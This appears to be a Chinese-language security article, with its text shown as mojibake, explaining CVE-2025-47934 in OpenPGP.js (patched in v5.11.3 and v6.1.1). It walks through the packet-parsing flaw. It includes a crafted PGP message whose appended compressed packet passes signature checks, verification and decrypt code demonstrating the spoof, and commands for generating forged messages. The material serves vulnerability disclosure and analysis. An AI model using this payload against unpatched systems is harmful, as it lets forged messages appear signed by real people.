> **åŸæ–‡é“¾æ¥**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531390&idx=1&sn=ea0a1db7611361fced3917c01d483312

#  CVE-2025-47934 â€“ æ¬ºéª— OpenPGP.js ç­¾åéªŒè¯  
 Otså®‰å…¨   2025-06-26 14:38  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
OpenPGP.js æ˜¯ä¸€ä¸ªåŸºäº RFC 9580 æ ‡å‡†çš„ JavaScript åº“ï¼Œæ”¯æŒæ¶ˆæ¯åŠ å¯†ï¼ˆå¯¹ç§°å’Œéå¯¹ç§°ï¼‰ã€ç­¾ååŠå¯†é’¥ç®¡ç†ï¼Œå¹¿æ³›åº”ç”¨äºæ”¯æŒåŠ å¯†çš„ç½‘é¡µé‚®ä»¶å®¢æˆ·ç«¯ã€‚ç„¶è€Œï¼Œè¯¥æ¼æ´æºäº OpenPGP.js å¯¹ç•¸å½¢æ•°æ®åŒ…åˆ—è¡¨çš„é”™è¯¯è§£æã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥å°†ä¸€ä¸ªåˆæ³•ç­¾åæ¶ˆæ¯ï¼ˆåŒ…å« One-Pass Signatureã€Literal Data å’Œ Signature æ•°æ®åŒ…ï¼‰é™„åŠ ä¸€ä¸ªæ¶æ„ Compressed Data æ•°æ®åŒ…ï¼ˆåŒ…å«ä¼ªé€ å†…å®¹ï¼‰ï¼Œå°½ç®¡è¿™ä¸æ˜¯æœ‰æ•ˆçš„ PGP æ¶ˆæ¯æ ¼å¼ï¼ŒOpenPGP.js ä»ä¼šæ¥å—å¹¶è¿”å›æ¶æ„å†…å®¹ä½œä¸ºç­¾åæ•°æ®ã€‚  
  
æŠ€æœ¯ç»†èŠ‚  
- è§£ææ¼æ´  
ï¼š  
openpgp.readMessage()  
Â å’ŒÂ   
PacketList.read()  
Â åœ¨æµå¼å¤„ç†æ•°æ®åŒ…æ—¶ï¼Œä»…è¯»å–æ”¯æŒæµå¼ä¼ è¾“çš„æ•°æ®åŒ…ï¼ˆå¦‚ Literal Dataï¼‰ï¼Œå¯¼è‡´åç»­æ¶æ„æ•°æ®åŒ…æœªè¢«åŠæ—¶æ£€æŸ¥ã€‚  
  
- éªŒè¯é”™è¯¯  
ï¼š  
Message.verify()  
Â å’ŒÂ   
unwrapCompressed()  
Â çš„é€»è¾‘è®¾è®¡ç¼ºé™·ï¼Œä½¿å¾—ç­¾åéªŒè¯åŸºäºåˆæ³•æ•°æ®ï¼Œè€Œæœ€ç»ˆè¿”å›çš„Â   
result.data  
Â å´æ¥è‡ªæ¶æ„æ•°æ®åŒ…ã€‚  
  
- åŠ å¯†æ¶ˆæ¯å½±å“  
ï¼š  
openpgp.decrypt()  
Â ç»“åˆè§£å¯†å’ŒéªŒè¯æ—¶ï¼ŒåŒæ ·å—å½±å“ï¼Œè¿”å›çš„Â   
data  
Â ä¸ºæ¶æ„å†…å®¹ï¼Œè€Œç­¾åéªŒè¯ä»åŸºäºåŸå§‹æ•°æ®ã€‚  
  
æ”»å‡»æ¼”ç¤º  
  
Codean Labs æä¾›äº†è¯¦ç»†çš„è¯æ˜-of-conceptï¼ˆPoCï¼‰ï¼Œé€šè¿‡ Python è„šæœ¬ï¼ˆå¦‚Â   
generate_spoofed_message.py  
ï¼‰å’Œ JavaScript éªŒè¯ç¨‹åºï¼Œå±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨åˆæ³•ç­¾åç”Ÿæˆä¼ªé€ æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼š  
- ä»åˆæ³•ç­¾åæ¶ˆæ¯ä¸­æå–ç­¾åï¼Œé™„åŠ æ¶æ„å†…å®¹åç”Ÿæˆä¼ªé€ æ¶ˆæ¯ã€‚  
  
- é’ˆå¯¹è·å…°å›½å®¶ç½‘ç»œå®‰å…¨ä¸­å¿ƒï¼ˆNCSCï¼‰çš„å…¬å¼€ç­¾åæ–‡ä»¶ï¼Œä¼ªé€ å‡ºâ€œæ¥è‡ª Codean Labs çš„é—®å€™â€å†…å®¹ï¼Œå¹¶é€šè¿‡éªŒè¯ã€‚  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taduicLLfJsI4WspZZ3J8HUoNvhUwJgS2U1hE06QgPTPE6ISCazOmeeqribqjWdiaMIlueSW2sm7vsMzQ/640?wx_fmt=png&from=appmsg "")  
  
è¿™æ˜¯CVE-2025-47934çš„è¯´æ˜ï¼Œå®ƒæ˜¯ Codean Labs å‘ç°çš„ OpenPGP.js æ¼æ´ï¼Œå·²åœ¨ v5.11.3 å’Œ v6.1.1 ä¸­ä¿®è¡¥ã€‚  
  
åœ¨è·å¾—ç›®æ ‡ä½œè€…ï¼ˆâ€œAliceâ€ï¼‰çš„æœ‰æ•ˆç­¾ååï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´â€œä¼ªé€ â€Aliceçš„ä»»æ„ç­¾åï¼ˆå³ä½¿æ˜¯åŠ å¯†æ¶ˆæ¯ï¼‰ï¼Œå³ä½¿å…¶ï¼ˆåœ¨OpenPGP.jsç”¨æˆ·çœ‹æ¥ï¼‰çœ‹èµ·æ¥åƒæ˜¯Aliceç­¾ç½²äº†ä»»æ„æ¶ˆæ¯ã€‚é‰´äºè¿™æ˜¯PGPçš„æ ¸å¿ƒåŸåˆ™ï¼Œä¼šç›´æ¥å½±å“æŸäº›é›†æˆåº”ç”¨ç¨‹åºï¼Œå› æ­¤æ•´ä½“é£é™©è¢«è®¤ä¸ºéå¸¸é«˜ã€‚  
  
æœ¬æ–‡è§£é‡Šäº†è¿™æ˜¯å¦‚ä½•å®ç°çš„ï¼Œå¹¶åœ¨æœ€åæä¾›äº†æ¦‚å¿µè¯æ˜ã€‚  
  
ä»‹ç»  
  
OpenPGP.js åº“æä¾›äº†RFC 9580ä¸­æŒ‡å®šçš„ OpenPGP æ ‡å‡†çš„å®ç°ã€‚å¦‚æœæ‚¨æ›¾ç»ä½¿ç”¨è¿‡åŠ å¯†ç”µå­é‚®ä»¶æˆ–ç­¾åçš„ git æäº¤ï¼Œæ‚¨å¯èƒ½å¯¹æ­¤æ ‡å‡†å¾ˆç†Ÿæ‚‰ã€‚ä»é«˜å±‚æ¬¡ä¸Šè®²ï¼ŒOpenPGP æ ‡å‡†æ”¯æŒæ¶ˆæ¯åŠ å¯†ï¼ˆå¯¹ç§°å’Œéå¯¹ç§°ï¼‰ã€æ¶ˆæ¯ç­¾åä»¥åŠå¯†é’¥ç®¡ç†åŠŸèƒ½ã€‚  
  
ä½¿ç”¨ OpenPGP.jsï¼Œå¯ä»¥ç”¨ JavaScript å®ç°æ‰€æœ‰è¿™äº›åŠŸèƒ½ã€‚è®¸å¤šæ”¯æŒåŠ å¯†çš„ Web ç”µå­é‚®ä»¶å®¢æˆ·ç«¯éƒ½ä½¿ç”¨äº† OpenPGP.jsï¼ŒåŒ…æ‹¬ Mailvelope å’Œ Proton Mailï¼ˆå°½ç®¡åè€…æœªå—æ­¤é—®é¢˜å½±å“ï¼‰ã€‚  
  
OpenPGPæ¶ˆæ¯æ ¼å¼  
  
æ‰€æœ‰ PGP æœ‰æ•ˆè½½è·ï¼ˆæ¶ˆæ¯ã€åˆ†ç¦»ç­¾åå’Œå¯†é’¥ï¼‰éƒ½ä»…ç”±ä¸€ç³»åˆ—æ•°æ®åŒ…ç»„æˆï¼Œæ²¡æœ‰æ€»ä½“æŠ¥å¤´ã€‚è¿™äº›æ•°æ®åŒ…éµå¾ªæ ‡å‡†å®šä¹‰çš„ç›¸å¯¹ç®€å•ä½†è‡ªå®šä¹‰çš„äºŒè¿›åˆ¶åè®®ã€‚ç”Ÿæˆçš„äºŒè¿›åˆ¶æœ‰æ•ˆè½½è·å¯ä»¥æŒ‰åŸæ ·å‘é€ï¼Œä½†é€šå¸¸ç»è¿‡ base64 ç¼–ç ï¼Œä»è€Œå½¢æˆâ€œASCII å°è£…â€çš„æœ‰æ•ˆè½½è·ï¼Œä¾‹å¦‚ï¼š  
  

```
-----BEGIN PGP MESSAGE-----
owGbwMvMwCV2JXpbW1xI0SnG0zxJDBkOns8zUnNy8rk6SlkYxLgYZMUUWWJ1LuTu
9HFSqpFcxgtTzcoEUsrAxSkAE4nSYPgrzdL1bQ1bvfG9h44/3Dtkk7njvjC9XHE/
2kzwLeOV+vTNjAyHZt4/96P3wN0H7x7Y79oondUbIc6a+Onj3578CtEn4Xu5AQ==
=0dLq
-----END PGP MESSAGE-----
```

  
  
è¯¥ç­¾åæ¶ˆæ¯ç”±ä»¥ä¸‹æ•°æ®åŒ…ç»„æˆï¼š  
  
å‹ç¼©æ•°æ®åŒ…ï¼šæœ¬èº«åŒ…å«ä¸€ä¸ªZIPå‹ç¼©åŒ…åˆ—è¡¨ï¼š  
1. ä¸€æ¬¡ç­¾ååŒ…ï¼šä¸€ä¸ªå¯é€‰åŒ…ï¼Œå…¶ä¸­åŒ…å«ï¼ˆé™¤å…¶ä»–å†…å®¹å¤–ï¼‰æ‰€ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ï¼Œå› æ­¤éªŒè¯è€…å¯ä»¥å¼€å§‹å¯¹åç»­æ•°æ®è¿›è¡Œå“ˆå¸Œå¤„ç†ã€‚  
  
1. æ–‡å­—æ•°æ®åŒ…ï¼šåŒ…å«æ¶ˆæ¯â€œhelloâ€ã€‚  
  
1. ç­¾ååŒ…ï¼šåŒ…å«å…¶ä¹‹å‰æ•°æ®å“ˆå¸Œå€¼çš„åŠ å¯†ï¼ˆEdDSAï¼‰ç­¾åã€‚  
  
æ­¤ç»“æ„å…·æœ‰ç›¸å½“å¤§çš„çµæ´»æ€§ã€‚ä¾‹å¦‚ï¼Œå°è£…å‹ç¼©æ•°æ®åŒ…å®Œå…¨æ˜¯å¯é€‰çš„ã€‚æˆ–è€…ï¼Œå†…éƒ¨çš„æ–‡å­—æ•°æ®åŒ…å¯ä»¥ç”¨å‹ç¼©æ•°æ®åŒ…æ›¿æ¢ï¼Œå…¶ä¸­åŒ…å«æ›´å¤šæ•°æ®åŒ…ï¼Œä¾‹å¦‚å±äºåŠ å¯†æ¶ˆæ¯æˆ–å…¶ä»–ç­¾åçš„æ•°æ®åŒ…ã€‚å…è®¸çš„æ•°æ®åŒ…ç»“æ„å·²åœ¨æ ‡å‡†ï¼ˆRFC 9580ï¼Œç¬¬ 10.3 èŠ‚ï¼‰ä¸­å®šä¹‰çš„è¯­æ³•è§„åˆ™ä¸­æ­£å¼åŒ–ã€‚  
  
æ— æ•ˆçš„æ•°æ®åŒ…åˆ—è¡¨  
  
ç°åœ¨è®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªå…·æœ‰ä»¥ä¸‹æ•°æ®åŒ…åˆ—è¡¨çš„ PGP æ¶ˆæ¯ï¼Œå…¶ä¸­æ•°æ®åŒ… 1-3 ç»„æˆåˆæ³•çš„ç­¾åæ¶ˆæ¯ï¼Œä½†æ·»åŠ äº†ç¬¬å››ä¸ªæ•°æ®åŒ…ï¼š  
1. ä¸€æ¬¡é€šè¿‡ç­¾ååŒ…  
  
1. æ–‡å­—æ•°æ®åŒ…ï¼ˆâ€œåˆæ³•â€ï¼‰  
  
1. ç­¾ååŒ…ï¼ˆå¯¹åŒ… 1 æœ‰æ•ˆï¼‰  
  
1. å‹ç¼©æ•°æ®åŒ…ï¼ŒåŒ…å«æ–‡å­—æ•°æ®åŒ…ï¼ˆâ€œæ¶æ„â€ï¼‰  
  
1. ç”±äºæœ«å°¾å­˜åœ¨ä¸€ä¸ªå‹ç¼©æ•°æ®  
  
åŒ…ï¼Œå› æ­¤è¿™ä¸æ˜¯ä¸€æ¡æœ‰æ•ˆçš„ OpenPGP æ¶ˆæ¯ã€‚ ç„¶è€Œï¼Œäº‹å®è¯æ˜ï¼ŒOpenPGP.js ä¸ä»…æ¥å—äº†è¯¥æ¶ˆæ¯å¹¶å°†å…¶è§†ä¸ºæœ‰æ•ˆï¼Œè¿˜åœ¨éªŒè¯ç­¾åæ˜¯å¦åˆæ³•çš„åŒæ—¶ï¼Œå°†â€œæ¶æ„â€æ•°æ®ä½œä¸ºç­¾åæ•°æ®è¿”å›ï¼  
  
ä¸ºäº†è¯æ˜è¿™ä¸€ç‚¹ï¼Œè®©æˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªç®€å•çš„éªŒè¯ç¨‹åºï¼Œç±»ä¼¼äºå®˜æ–¹æ–‡æ¡£ä¸­ç»™å‡ºçš„ç¨‹åºï¼Œå¹¶å°†æˆ‘ä»¬ç‰¹æœ‰çš„æ•°æ®åŒ…åˆ—è¡¨ä½œä¸ºæ¶ˆæ¯ä¼ é€’ç»™å®ƒï¼š  
  

```
constÂ openpgp =Â require('openpgp');

(asyncÂ () => {
Â  Â Â // Generated using:
Â  Â Â // cat \
Â  Â Â // <(echo &#34;legitimate&#34; | gpg -s -z0) \
Â  Â Â // <(printf &#34;\xc8\x12\0\xcb\x0f\x62\0\0\0\0\0malicious&#34;) \
Â  Â Â // | base64
Â  Â Â letÂ armoredMessage = `
-----BEGIN PGP MESSAGE-----

kA0DAAoW1Fu2hl5UcsoByxFiAGhBNptsZWdpdGltYXRlCoh1BAAWCgAdFiEEXSzQbblMQiJ8GaYN
1Fu2hl5UcsoFAmhBNpsACgkQ1Fu2hl5UcsqE0QD/bsWYHJrrrK8RM8VgB4Z3K64zWfp49BOi+x0s
9VJKyRoBALJdQhGzPwCERCANPR+KdX5ZdrX54ZpY9mriFG6O4hsFyBIAyw9iAAAAAABtYWxpY2lv
dXM=
-----END PGP MESSAGE-----`;

Â  Â Â // public key of thomas@codean.io
Â  Â Â constÂ publicKeyArmored = `
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEZSAfBhYJKwYBBAHaRw8BAQdAfdgd2yxL+pYN91ENyp/VZVdWXLjYDONG47jM
4dDZDMG0IFRob21hcyBSaW5zbWEgPHRob21hc0Bjb2RlYW4uaW8+iI8EExYIADcW
IQRdLNBtuUxCInwZpg3UW7aGXlRyygUCZSAfBgUJBaOagAIbAwQLCQgHBRUICQoL
BRYCAwEAAAoJENRbtoZeVHLKpvIBANiaDeLPyaQyHkuzB8T6ZqvfJi4dXNlsqT2F
dlUUip4ZAQDSAljghQC9jAQu8I8yMrQJd4SXD1EMH+NLNNYCDEZCC7g4BGUgHwYS
CisGAQQBl1UBBQEBB0DOFmUm2nMIda8PzTquulLLy/bFwDtSqAiK1EBqEdvbaAMB
CAeIfgQYFggAJhYhBF0s0G25TEIifBmmDdRbtoZeVHLKBQJlIB8GBQkFo5qAAhsM
AAoJENRbtoZeVHLKCE8BAJEXE6za1G6pFpaZWKBRMlCbBDSE4rc7iEn5MpC56WtQ
AQCnVhRNYBjQ7Bo/VX1rx2+6wx84EXOFmoW80F96QmN0Bw==
=Obk+
-----END PGP PUBLIC KEY BLOCK-----`;

Â  Â Â constÂ publicKey =Â awaitÂ openpgp.readKey({ armoredKey: publicKeyArmored });
Â  Â Â constÂ message =Â awaitÂ openpgp.readMessage({ armoredMessage });
Â  Â Â constÂ verificationResult =Â awaitÂ openpgp.verify({ message, verificationKeys: publicKey });

Â  Â Â console.log(`Signed message data: ${verificationResult.data}`);
Â  Â Â constÂ { verified, keyID } = verificationResult.signatures[0];
Â  Â Â tryÂ {
Â  Â  Â  Â Â awaitÂ verified;Â // throws on invalid signature
Â  Â  Â  Â Â console.log(`Verified signature by key id ${keyID.toHex()}`);
Â  Â  }Â catchÂ (e) {
Â  Â  Â  Â Â thrownewError(`Signature could not be verified: ${e.message}`);
Â  Â  }
})();
```

  
  
å°†ä»¥ä¸‹å†…å®¹æ‰“å°åˆ°æ§åˆ¶å°ï¼š  
  

```
Signed message data:Â malicious
Verified signature by key id d45bb6865e5472ca
```

  
  
è¿™å¤ªç³Ÿç³•äº†ï¼è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å—å®³è€…ä¹‹å‰åˆ›å»ºçš„ä»»ä½•æœ‰æ•ˆç­¾åï¼Œå¹¶åœ¨ç­¾åä»ç„¶æœ‰æ•ˆçš„æƒ…å†µä¸‹ç”¨ä»»ä½•å†…å®¹â€œæ›¿æ¢â€å·²ç­¾åçš„æ•°æ®ã€‚  
  
è¦äº†è§£ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ OpenPGP.js å¦‚ä½•è§£ææ¶ˆæ¯ã€‚  
  
ä¸€ä¸ªä¸¥é‡çš„é”™è¯¯  
  
ä¼ å…¥çš„ PGP æ¶ˆæ¯ä½¿ç”¨é«˜çº§ API è¿›è¡Œè§£æopenpgp.readMessage()ï¼Œæœ€ç»ˆè°ƒç”¨PacketList.read()ã€‚  
  
å°†è¾“å…¥æ•°æ®åŒ…åˆ—è¡¨è½¬æ¢ä¸ºæµåï¼ŒPacketList.read()ä»æµä¸­è¯»å–åˆå§‹æ•°æ®åŒ…åºåˆ—ï¼Œç›´åˆ°é‡åˆ°æµçš„æœ«å°¾æˆ–æ”¯æŒæµå¼ä¼ è¾“çš„æ•°æ®åŒ…ç±»å‹ï¼ˆsupportsStreaming(value.constructor.tag)ï¼‰ï¼Œä¾‹å¦‚æ–‡å­—æ•°æ®åŒ…ï¼š  
> OpenPGP æ•°æ®åŒ…æ ¼å¼å…è®¸å°†åŒ…å«ä»»æ„é•¿åº¦æ•°æ®çš„æ•°æ®åŒ…ç±»å‹æ‹†åˆ†æˆå¤šä¸ªå—ï¼Œå¹¶åœ¨å…¶æŠ¥å¤´ä¸­ä½¿ç”¨â€œéƒ¨åˆ†ä¸»ä½“é•¿åº¦â€è¿›è¡ŒåŒºåˆ†ã€‚è§£æç«¯éœ€è¦ä¸€äº›é€»è¾‘æ¥é‡æ–°ç»„åˆè¿™äº›æ•°æ®åŒ…ï¼Œå› æ­¤è¿™å°±æ˜¯supportsStreaming()æ‰€æŒ‡çš„ã€‚  
  
  

```
// Wait until first few packets have been read
Â  Â Â constÂ reader = streamGetReader(this.stream);
Â  Â Â whileÂ (true) {
Â  Â  Â Â constÂ { done,Â valueÂ } =Â awaitÂ reader.read();
Â  Â  Â Â ifÂ (!done) {
Â  Â  Â  Â Â this.push(value);
Â  Â  Â  }Â elseÂ {
Â  Â  Â  Â Â this.stream =Â null;
Â  Â  Â  }
Â  Â  Â Â ifÂ (done || supportsStreaming(value.constructor.tag)) {
Â  Â  Â  Â Â break;
Â  Â  Â  }
Â  Â  }
```

  
  
å¦‚æœæˆ‘ä»¬é‡‡ç”¨ä¹‹å‰çš„æ¶æ„æ•°æ®åŒ…åˆ—è¡¨ï¼Œåˆ™æ„å‘³ç€åœ¨æœ¬æ¬¡å¾ªç¯ä¹‹åï¼ˆå³è°ƒç”¨ ä¹‹åopenpgp.readMessage()ï¼‰ï¼Œæ¶ˆæ¯çš„å†…éƒ¨packetsæ•°ç»„ï¼ˆ çš„ä¸€ä¸ªå®ä¾‹PacketListï¼‰å°†ä»…åŒ…å«æ•°æ®åŒ… 1 å’Œ 2ï¼Œå³å•æ¬¡ä¼ é€’ç­¾åå’Œæ–‡å­—æ•°æ®ï¼ˆâ€œåˆæ³•â€ï¼‰æ•°æ®åŒ…ã€‚å…¶ä½™æ•°æ®åŒ…å¯èƒ½æš‚æ—¶ä¸éœ€è¦ï¼Œå› æ­¤ä»å¾…ä»æ•°æ®åŒ…æµä¸­è¯»å–ã€‚  
  
openpgp.verify()æ¥ä¸‹æ¥ï¼Œç”¨æˆ·å¯¹ è¿”å›çš„æ¶ˆæ¯å¯¹è±¡è°ƒç”¨é«˜çº§ API openpgp.readMessage()ã€‚è¿™å°†è°ƒç”¨å†…éƒ¨æ–¹æ³•Message.verify()ï¼Œå…¶å¯åŠ¨æ–¹å¼å¦‚ä¸‹ï¼š  
  

```
asyncÂ verify(verificationKeys, date =Â newDate(), config = defaultConfig) {
Â  Â Â constÂ msg =Â this.unwrapCompressed();Â // (1)
Â  Â Â 
Â  Â Â constÂ literalDataList = msg.packets.filterByTag(enums.packet.literalData);
Â  Â Â ifÂ (literalDataList.length !==Â 1) {
Â  Â  Â Â thrownewError('Can only verify message with one literal data packet.');
Â  Â  }
Â  Â Â 
Â  Â Â ifÂ (isArrayStream(msg.packets.stream)) {
Â  Â  Â  msg.packets.push(...await streamReadToEnd(msg.packets.stream, _ => _ || []));Â // (2)
Â  Â  }

Â  Â Â constÂ onePassSigList = msg.packets.filterByTag(enums.packet.onePassSignature).reverse();
Â  Â Â constÂ signatureList = msg.packets.filterByTag(enums.packet.signature);

Â  Â Â // ...
```

  
  
ä¸ºäº†è¿›è¡Œç­¾åéªŒè¯ï¼Œæ­¤å‡½æ•°ä»æ¶ˆæ¯ä¸­è·å–æ–‡å­—æ•°æ®åŒ… ( literalDataList) å’Œç­¾åæ•°æ®åŒ… ( )ã€‚ ç”±äºæ•°æ®åŒ…åˆ—è¡¨å¯èƒ½å°šæœªä»æµä¸­å®Œå…¨æ£€ç´¢åˆ°ï¼ˆå°±åƒæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ä¸€æ ·ï¼‰ï¼Œå› æ­¤ä¼šè°ƒç”¨ å°†æ‰€æœ‰å‰©ä½™çš„æ•°æ®åŒ…è¯»å…¥æ•°ç»„ (2)ã€‚å…³é”®åœ¨äºï¼Œæ­¤æ“ä½œå‘ç”Ÿåœ¨ä½¿ç”¨ (1) è·å–è‡ªèº«ä¹‹åã€‚signatureList  
  
streamReadToEnd()msg.packets msgthis.unwrapCompressed()  
  
è¿™æ˜¯ä¸€ä¸ªè¾…åŠ©æ–¹æ³•ï¼Œå®ƒè¦ä¹ˆè¿”å›æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå‹ç¼©æ•°æ®åŒ…å†…çš„æ•°æ®åŒ…åˆ—è¡¨ï¼Œè¦ä¹ˆåœ¨æ²¡æœ‰æ‰¾åˆ°å‹ç¼©æ•°æ®åŒ…çš„æƒ…å†µä¸‹ä»…è¿”å›thisï¼ˆåŸå§‹æ•°æ®åŒ…åˆ—è¡¨ï¼‰ï¼š  
  

```
unwrapCompressed() {
Â  Â Â constÂ compressed =Â this.packets.filterByTag(enums.packet.compressedData);
Â  Â Â ifÂ (compressed.length) {
Â  Â  Â Â returnnewÂ Message(compressed[0].packets);
Â  Â  }
Â  Â Â returnthis;
Â  }
```

  
  
æ­¤æ—¶ï¼Œä»ç„¶ä»…ç”±æˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ï¼ˆä¸€æ¬¡ä¼ é€’ç­¾åå’Œæ–‡å­—æ•°æ®ï¼ˆâ€œåˆæ³•â€ï¼‰ï¼‰this.packetsçš„æ•°æ®åŒ… 1 å’Œ 2 ç»„æˆï¼Œå› æ­¤è¿”å›å¹¶å°†æ•°æ®åŒ… 2 ç”¨ä½œã€‚thisliteralDataList  
  
å‡è®¾æ•°æ®åŒ… 3 æ˜¯æ•°æ®åŒ… 2 çš„æœ‰æ•ˆç­¾åï¼ˆâ€œåˆæ³•â€ï¼‰ï¼Œmessage.verify()åˆ™å°†æˆåŠŸå¹¶ä¸”æ§åˆ¶æµè¿”å›åˆ°openpgp.verify()ï¼š  
  

```
...
Â  Â Â ifÂ (signature) {
Â  Â  Â  result.signatures =Â awaitÂ message.verifyDetached(signature, verificationKeys, date, config);
Â  Â  }Â elseÂ {
Â  Â  Â  result.signatures =Â awaitÂ message.verify(verificationKeys, date, config);
Â  Â  }
Â  Â  result.data = format ===Â 'binary'Â ? message.getLiteralData() : message.getText();
Â  Â  ...
```

  
  
æ¥ä¸‹æ¥ï¼Œresult.dataè®¾ç½®ä¸ºçš„è¾“å‡ºmessage.getLiteralData()ï¼ˆæˆ–message.getText()ï¼ŒåŠŸèƒ½ç­‰æ•ˆï¼‰ï¼Œè¿™å†æ¬¡åˆ©ç”¨äº†unwrapCompressed()ï¼š  
  

```
getLiteralData() {
Â  Â Â constÂ msg =Â this.unwrapCompressed();
Â  Â Â constÂ literal = msg.packets.findPacket(enums.packet.literalData);
Â  Â Â returnÂ (literal && literal.getBytes()) ||Â null;
Â  }
```

  
  
ç„¶è€Œï¼Œè¿™æ¬¡msg.packetsåŒ…å«å®Œæ•´çš„æ•°æ®åŒ…åˆ—è¡¨ï¼ˆç”±äºstreamReadToEnd()ä¹‹å‰è°ƒç”¨è¿‡ï¼‰ï¼Œå› æ­¤unwrapCompressed()å°†è¿”å›å®ƒé‡åˆ°çš„ç¬¬ä¸€ä¸ªå‹ç¼©æ•°æ®åŒ…ï¼ˆæ•°æ®åŒ… 4ï¼‰çš„å†…å®¹ï¼Œè¿™æ˜¯æ”»å‡»è€…æ’å…¥çš„æ–‡å­—æ•°æ®åŒ…ï¼ˆâ€œæ¶æ„â€ï¼‰ã€‚  
  
æ­¤æ—¶éªŒè¯é€šè¿‡åï¼Œæ‰‹åŠ¨è°ƒç”¨message.getText()ä¹Ÿä¼šè¿”å›æ¶æ„çš„LiteralDataå†…å®¹ï¼š  
  

```
constÂ message =Â awaitÂ openpgp.readMessage({ payload });

console.log(message.getText());Â // prints &#34;legitimate&#34;

constÂ verificationResult =Â awaitÂ openpgp.verify({ message, verificationKeys: publicKey });
// verificationResult represents a valid signature

console.log(message.getText());Â // prints &#34;malicious&#34;
console.log(verificationResult.data);Â // prints &#34;malicious&#34;
```

  
  
è¿™ç§é€»è¾‘æ˜¾ç„¶æ˜¯ä¸ºäº†çµæ´»å¤„ç†å‹ç¼©å’Œæœªå‹ç¼©çš„æ–‡å­—æ•°æ®åŒ…ã€‚ä½†ä¼¼ä¹æ²¡æœ‰äººè€ƒè™‘åˆ°è¿™ç§æ ¼å¼é”™è¯¯çš„æ•°æ®åŒ…åˆ—è¡¨ï¼  
  
åŠ å¯†æ¶ˆæ¯  
  
å¯¹äºå·²ç­¾åå¹¶åŠ å¯†çš„æ¶ˆæ¯ï¼Œæƒ…å†µç”šè‡³æ›´ç³Ÿã€‚é«˜çº§ APIopenpgp.decrypt()å°†è§£å¯†å’ŒéªŒè¯ç»“åˆåœ¨ä¸€èµ·ï¼Œå¹¶ä¸”é€šå¸¸ï¼ˆä¾‹å¦‚åœ¨å®˜æ–¹ç¤ºä¾‹ä»£ç ä¸­ï¼‰ä»å…¶è¾“å‡ºä¸­è·å–è§£å¯†æ•°æ®dataï¼ŒåŒæ—¶æ ¹æ®å…¶signaturesè¾“å‡ºç¡®å®šç­¾åçš„æœ‰æ•ˆæ€§ã€‚  
  
ç”±äºopenpgp.decrypt()Just å‡½æ•°åœ¨åº•å±‚ä½¿ç”¨äº†ç›¸åŒçš„éªŒè¯é€»è¾‘ï¼Œå› æ­¤å­˜åœ¨åŒæ ·çš„ç¼ºé™·ã€‚å› æ­¤ï¼Œè¿”å›çš„dataæ˜¯æ”»å‡»è€…æ§åˆ¶çš„ Payloadï¼ˆâ€œæ¶æ„â€ï¼‰ï¼Œè€Œç­¾åéªŒè¯ç»“æœæ˜¯åŸºäºåŸå§‹ Payload è®¡ç®—å¾—å‡ºçš„ï¼ˆâ€œåˆæ³•â€ï¼‰ã€‚  
  

```
constÂ { data, signatures } =Â awaitÂ openpgp.decrypt({
Â  Â  message,
Â  Â  verificationKeys: publicKey
Â  Â  decryptionKeys: privateKey
});
console.log(data);Â // prints &#34;malicious&#34;

tryÂ {
Â  Â Â awaitÂ signatures[0].verified;
Â  Â Â console.log('Signature is valid');Â // prints &#34;Signature is valid&#34;
}Â catchÂ (e) {}
```

  
  
æ²¡æœ‰åƒ é‚£æ ·çš„åº”æ€¥å‡ºå£openpgp.verify()ï¼Œmessage.getText()å¯ä»¥åœ¨éªŒè¯ä¹‹å‰è°ƒç”¨ã€‚å”¯ä¸€å®‰å…¨çš„ç”¨æ³•æ˜¯å°†è§£å¯†å’ŒéªŒè¯åˆ†å¼€ï¼Œåˆ†ä¸ºä¸¤ä¸ªä¸åŒçš„æ­¥éª¤ï¼ŒverificationKeysç¬¬ä¸€æ­¥ä¸ä½¿ç”¨å‚æ•°ã€‚  
  
æ¦‚å¿µéªŒè¯  
> ä»æˆ‘ä»¬çš„ PoC å­˜å‚¨åº“ä¸‹è½½è¿™äº›æ–‡ä»¶ã€‚  
  
> https://github.com/codean-labs/pocs/tree/main/CVE-2025-47934%20(OpenPGP.js)  
  
  
å¦‚ä¸Šæ‰€ç¤ºï¼Œæ„å»ºæ¶æ„è½½è·åªéœ€è·å–ä¸€æ¡ç°æœ‰çš„ç­¾åæ¶ˆæ¯ï¼ˆå¿…è¦æ—¶ç§»é™¤åŒ…è£…å‹ç¼©ï¼‰ï¼Œå¹¶é™„åŠ ä¸€ä¸ªåŒ…å«æ¶æ„æ–‡å­—æ•°æ®åŒ…çš„å‹ç¼©æ•°æ®åŒ…å³å¯ã€‚ä¸ºäº†æ–¹ä¾¿æ·»åŠ ä»»æ„æ¶æ„æ–‡æœ¬ï¼Œæˆ‘ä»¬ç¼–å†™äº†ä¸€ä¸ªå°å‹ Python è„šæœ¬ ( )ï¼Œå®ƒå¯ä»¥ä¸ºæ‚¨ç”Ÿæˆæ•°æ®åŒ…å¤´ï¼Œå¹¶æ‰“å°å‡ºç»è¿‡ ASCII ç¼–ç çš„ä¼ªé€ æ¶ˆæ¯ç‰ˆæœ¬ï¼šgenerate_spoofed_message.py  
  

```
$echo&#34;hello world&#34;Â | gpg -s -z0 > legit_signed_message.pgp
$Â python generate_spoofed_message.py legit_signed_message.pgp > spoofed_message.asc
